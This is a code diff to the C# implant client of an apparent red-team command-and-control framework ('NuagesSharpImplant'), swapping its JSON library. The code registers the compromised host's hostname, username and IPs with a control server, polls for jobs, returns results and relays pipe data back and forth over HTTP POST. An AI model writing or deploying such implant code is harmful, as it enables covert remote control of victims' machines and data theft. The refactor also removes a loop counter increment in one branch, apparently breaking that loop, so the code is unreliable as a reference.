@@ -1,7 +1,7 @@
 ﻿using System;
 using System.Collections.Generic;
 using System.IO;
-using Newtonsoft.Json.Linq;
+using System.Json;
 
 namespace NuagesSharpImplant
 {
@@ -50,63 +50,62 @@ namespace NuagesSharpImplant
         {
             return this.NC2Con.POST(url, jsonContent);
         }
+
         public void SubmitJobResult(string jobId, string result = "", bool moreData = false, bool error = false, int n = 0, string data = "")
         {
-            JObject body = new JObject(
-                new JProperty("n", n),
-                new JProperty("moreData", moreData),
-                new JProperty("error", error),
-                new JProperty("result", result),
-                new JProperty("jobId", jobId),
-                new JProperty("data", data)
-            );
+            List<KeyValuePair<string, JsonValue>> list = new List<KeyValuePair<string, JsonValue>>();
+            list.Add(new KeyValuePair<string, JsonValue>("jobId", jobId));
+            list.Add(new KeyValuePair<string, JsonValue>("result", result));
+            list.Add(new KeyValuePair<string, JsonValue>("moreData", moreData));
+            list.Add(new KeyValuePair<string, JsonValue>("error", error));
+            list.Add(new KeyValuePair<string, JsonValue>("n", n));
+            list.Add(new KeyValuePair<string, JsonValue>("data", data));
+            JsonObject body = new JsonObject(list);
             this.POST("jobresult", body.ToString());
         }
 
         public string RegisterImplant(string type = "", string hostname = "", string username = "", string localIp = "", string sourceIp = "", string os = "", string handler = "", string connectionString = "", Dictionary<string, string> config = null, String[] supportedPayloads = null)
         {
-            JObject body = new JObject(
-                new JProperty("implantType", type),
-                new JProperty("hostname", hostname),
-                new JProperty("username", username),
-                new JProperty("localIp", localIp),
-                new JProperty("sourceIp", sourceIp),
-                new JProperty("os", os),
-                new JProperty("handler", handler),
-                new JProperty("connectionString", connectionString),
-                new JProperty("config", JObject.FromObject(config)),
-                new JProperty("supportedPayloads", JArray.FromObject(supportedPayloads))
-            );
-            JObject response = JObject.Parse(this.POST("register", body.ToString()));
-            return response["_id"].ToString();
-        }
 
-        public JArray Heartbeat(string implantId)
-        {
-            JObject body = new JObject(
-                new JProperty("id", implantId)
-            );
-            JObject response = JObject.Parse(this.POST("heartbeat", body.ToString()));
-            return (JArray)response["data"];
-        }
-
-        public string GetFileChunk(string fileId, int n)
-        {
-            JObject body = new JObject(
-                new JProperty("n", n),
-                new JProperty("file_id", fileId)
-            );
-
-            JObject response = JObject.Parse(this.POST("chunks", body.ToString()));
-            try
+            List<KeyValuePair<string, JsonValue>> configList = new List<KeyValuePair<string, JsonValue>>();
+            foreach (KeyValuePair<string, string> p in config)
             {
-                return response["data"].ToString();
+                configList.Add(new KeyValuePair<string, JsonValue>(p.Key, p.Value));
             }
-            catch
-            {
-                return "";
+            JsonObject configObject = new JsonObject(configList);
+
+            JsonArray supportedPayloadsArray = new JsonArray();
+
+            foreach (string p in supportedPayloads) {
+                supportedPayloadsArray.Add(p);
             }
+
+            List<KeyValuePair<string, JsonValue>> list = new List<KeyValuePair<string, JsonValue>>();
+            list.Add(new KeyValuePair<string, JsonValue>("implantType", type));
+            list.Add(new KeyValuePair<string, JsonValue>("hostname", hostname));
+            list.Add(new KeyValuePair<string, JsonValue>("username", username));
+            list.Add(new KeyValuePair<string, JsonValue>("localIp", localIp));
+            list.Add(new KeyValuePair<string, JsonValue>("sourceIp", sourceIp));
+            list.Add(new KeyValuePair<string, JsonValue>("os", os));
+            list.Add(new KeyValuePair<string, JsonValue>("handler", handler));
+            list.Add(new KeyValuePair<string, JsonValue>("connectionString", connectionString));
+            list.Add(new KeyValuePair<string, JsonValue>("config", configObject));
+            list.Add(new KeyValuePair<string, JsonValue>("supportedPayloads", supportedPayloadsArray));
+            JsonObject body = new JsonObject(list);
+
+            JsonValue response = JsonValue.Parse(this.POST("register", body.ToString()));
+            return response["_id"];
         }
+
+        public JsonArray Heartbeat(string implantId)
+        {
+            List<KeyValuePair<string, JsonValue>> list = new List<KeyValuePair<string, JsonValue>>();
+            list.Add(new KeyValuePair<string, JsonValue>("id", implantId));
+            JsonObject body = new JsonObject(list);
+            JsonValue response = JsonValue.Parse(this.POST("heartbeat", body.ToString()));
+            return (JsonArray)response["data"];
+        }
+
         public byte[] PipeRead(string pipe_id, int BytesWanted)
         {
             byte[] buffer;
@@ -114,12 +113,12 @@ namespace NuagesSharpImplant
             {
                 while (memory.Length < BytesWanted)
                 {
-                    JObject body = new JObject(
-                    new JProperty("pipe_id", pipe_id),
-                    new JProperty("maxSize", Math.Min(this.getBufferSize(), BytesWanted - memory.Length))
-                    );
-                    JObject response = JObject.Parse(this.POST("io", body.ToString()));
-                    buffer = Convert.FromBase64String(response["out"].ToString());
+                    List<KeyValuePair<string, JsonValue>> list = new List<KeyValuePair<string, JsonValue>>();
+                    list.Add(new KeyValuePair<string, JsonValue>("pipe_id", pipe_id));
+                    list.Add(new KeyValuePair<string, JsonValue>("maxSize", Math.Min(this.getBufferSize(), BytesWanted - memory.Length)));
+                    JsonObject body = new JsonObject(list);
+                    JsonValue response = JsonValue.Parse(this.POST("io", body.ToString()));
+                    buffer = Convert.FromBase64String(response["out"]);
                     memory.Write(buffer, 0, buffer.Length);
                     System.Threading.Thread.Sleep(this.getRefreshRate());
                 }
@@ -133,12 +132,12 @@ namespace NuagesSharpImplant
             byte[] buffer;
             while (ReadBytes < BytesWanted)
             {
-                JObject body = new JObject(
-                new JProperty("pipe_id", pipe_id),
-                new JProperty("maxSize", Math.Min(this.getBufferSize(), BytesWanted - ReadBytes))
-                );
-                JObject response = JObject.Parse(this.POST("io", body.ToString()));
-                buffer = Convert.FromBase64String(response["out"].ToString());
+                List<KeyValuePair<string, JsonValue>> list = new List<KeyValuePair<string, JsonValue>>();
+                list.Add(new KeyValuePair<string, JsonValue>("pipe_id", pipe_id));
+                list.Add(new KeyValuePair<string, JsonValue>("maxSize", Math.Min(this.getBufferSize(), BytesWanted - ReadBytes)));
+                JsonObject body = new JsonObject(list);
+                JsonValue response = JsonValue.Parse(this.POST("io", body.ToString()));
+                buffer = Convert.FromBase64String(response["out"]);
                 ReadBytes += buffer.Length;
                 stream.Write(buffer, 0, buffer.Length);
                 System.Threading.Thread.Sleep(this.getRefreshRate());
@@ -149,26 +148,27 @@ namespace NuagesSharpImplant
         {
             int ReadBytes = 0;
             byte[] buffer = new byte[this.getBufferSize()];
-            JObject body;
+            JsonObject body;
+            List<KeyValuePair<string, JsonValue>> list;
             while ((ReadBytes = stream.Read(buffer, 0, this.getBufferSize())) > 0)
             {
                 if (ReadBytes < this.getBufferSize())
                 {
                     byte[] buffer2 = new byte[ReadBytes];
                     Array.Copy(buffer, 0, buffer2, 0, ReadBytes);
-                    body = new JObject(
-                    new JProperty("pipe_id", pipe_id),
-                    new JProperty("maxSize", 0),
-                    new JProperty("in", Convert.ToBase64String(buffer2))
-                    );
+                    list = new List<KeyValuePair<string, JsonValue>>();
+                    list.Add(new KeyValuePair<string, JsonValue>("pipe_id", pipe_id));
+                    list.Add(new KeyValuePair<string, JsonValue>("maxSize", 0));
+                    list.Add(new KeyValuePair<string, JsonValue>("in", Convert.ToBase64String(buffer2)));
+                    body = new JsonObject(list);
                 }
                 else
                 {
-                    body = new JObject(
-                    new JProperty("pipe_id", pipe_id),
-                    new JProperty("maxSize", 0),
-                     new JProperty("in", Convert.ToBase64String(buffer))
-                    );
+                    list = new List<KeyValuePair<string, JsonValue>>();
+                    list.Add(new KeyValuePair<string, JsonValue>("pipe_id", pipe_id));
+                    list.Add(new KeyValuePair<string, JsonValue>("maxSize", 0));
+                    list.Add(new KeyValuePair<string, JsonValue>("in", Convert.ToBase64String(buffer)));
+                    body = new JsonObject(list);
                 }
                 this.POST("io", body.ToString());
                 System.Threading.Thread.Sleep(this.getRefreshRate());
@@ -177,12 +177,12 @@ namespace NuagesSharpImplant
 
         public byte[] PipeRead(string pipe_id)
         {
-            JObject body = new JObject(
-                    new JProperty("pipe_id", pipe_id),
-                    new JProperty("maxSize", this.getBufferSize())
-                );
-            JObject response = JObject.Parse(this.POST("io", body.ToString()));
-            return Convert.FromBase64String(response["out"].ToString());
+            List<KeyValuePair<string, JsonValue>>  list = new List<KeyValuePair<string, JsonValue>>();
+            list.Add(new KeyValuePair<string, JsonValue>("pipe_id", pipe_id));
+            list.Add(new KeyValuePair<string, JsonValue>("maxSize", this.getBufferSize()));
+            JsonObject body = new JsonObject(list);
+            JsonValue response = JsonValue.Parse(this.POST("io", body.ToString()));
+            return Convert.FromBase64String(response["out"]);
         }
 
         public void PipeWrite(string pipe_id, byte[] data)
@@ -191,27 +191,29 @@ namespace NuagesSharpImplant
             int refreshrate = this.getRefreshRate();
             int bufferSize = this.getBufferSize();
             byte[] buffer = new byte[bufferSize];
-            JObject body;
+            JsonObject body;
+            List<KeyValuePair<string, JsonValue>> list;
             while (sentData < data.Length)
             {
                 if ((data.Length - sentData) < bufferSize) {
                     byte[] buffer2 = new byte[data.Length - sentData];
                     Array.Copy(data, sentData, buffer2, 0, data.Length - sentData);
-                    body = new JObject(
-                        new JProperty("pipe_id", pipe_id),
-                        new JProperty("in", Convert.ToBase64String(buffer2)),
-                        new JProperty("maxSize", 0)
-                    );
+                    list = new List<KeyValuePair<string, JsonValue>>();
+                    list.Add(new KeyValuePair<string, JsonValue>("pipe_id", pipe_id));
+                    list.Add(new KeyValuePair<string, JsonValue>("maxSize", 0));
+                    list.Add(new KeyValuePair<string, JsonValue>("in", Convert.ToBase64String(buffer2)));
+                    body = new JsonObject(list);
+
                     sentData = data.Length;
                 }
                 else
                 {
                     Array.Copy(data, sentData, buffer, 0, bufferSize);
-                    body = new JObject(
-                        new JProperty("pipe_id", pipe_id),
-                        new JProperty("in", Convert.ToBase64String(buffer)),
-                        new JProperty("maxSize", 0)
-                    );
+                    list = new List<KeyValuePair<string, JsonValue>>();
+                    list.Add(new KeyValuePair<string, JsonValue>("pipe_id", pipe_id));
+                    list.Add(new KeyValuePair<string, JsonValue>("maxSize", 0));
+                    list.Add(new KeyValuePair<string, JsonValue>("in", Convert.ToBase64String(buffer)));
+                    body = new JsonObject(list);
                     sentData += bufferSize;
                 }
                 this.POST("io", body.ToString());
@@ -226,7 +228,8 @@ namespace NuagesSharpImplant
             int refreshrate = this.getRefreshRate();
             int bufferSize = this.getBufferSize();
             byte[] buffer = new byte[bufferSize];
-            JObject body;
+            JsonObject body;
+            List<KeyValuePair<string, JsonValue>> list;
             using (MemoryStream memory = new MemoryStream()) { 
                 while (sentData < data.Length)
                 {
@@ -234,25 +237,25 @@ namespace NuagesSharpImplant
                     {
                         byte[] buffer2 = new byte[data.Length - sentData];
                         Array.Copy(data, sentData, buffer2, 0, data.Length - sentData);
-                        body = new JObject(
-                            new JProperty("pipe_id", pipe_id),
-                            new JProperty("in", Convert.ToBase64String(buffer2)),
-                            new JProperty("maxSize", bufferSize)
-                        );
+                        list = new List<KeyValuePair<string, JsonValue>>();
+                        list.Add(new KeyValuePair<string, JsonValue>("pipe_id", pipe_id));
+                        list.Add(new KeyValuePair<string, JsonValue>("maxSize", bufferSize));
+                        list.Add(new KeyValuePair<string, JsonValue>("in", Convert.ToBase64String(buffer2)));
+                        body = new JsonObject(list);
+
                         sentData = data.Length;
                     }
                     else
                     {
                         Array.Copy(data, sentData, buffer, 0, bufferSize);
-                        body = new JObject(
-                            new JProperty("pipe_id", pipe_id),
-                            new JProperty("in", Convert.ToBase64String(buffer)),
-                            new JProperty("maxSize", bufferSize)
-                        );
-                        sentData += bufferSize;
+                        list = new List<KeyValuePair<string, JsonValue>>();
+                        list.Add(new KeyValuePair<string, JsonValue>("pipe_id", pipe_id));
+                        list.Add(new KeyValuePair<string, JsonValue>("maxSize", bufferSize));
+                        list.Add(new KeyValuePair<string, JsonValue>("in", Convert.ToBase64String(buffer)));
+                        body = new JsonObject(list);
                     }
-                    JObject response = JObject.Parse(this.POST("io", body.ToString()));
-                    buffer = Convert.FromBase64String(response["out"].ToString());
+                    JsonValue response = JsonValue.Parse(this.POST("io", body.ToString()));
+                    buffer = Convert.FromBase64String(response["out"]);
                     memory.Write(buffer, 0, buffer.Length);
                     System.Threading.Thread.Sleep(this.getRefreshRate());
                     System.Threading.Thread.Sleep(refreshrate);
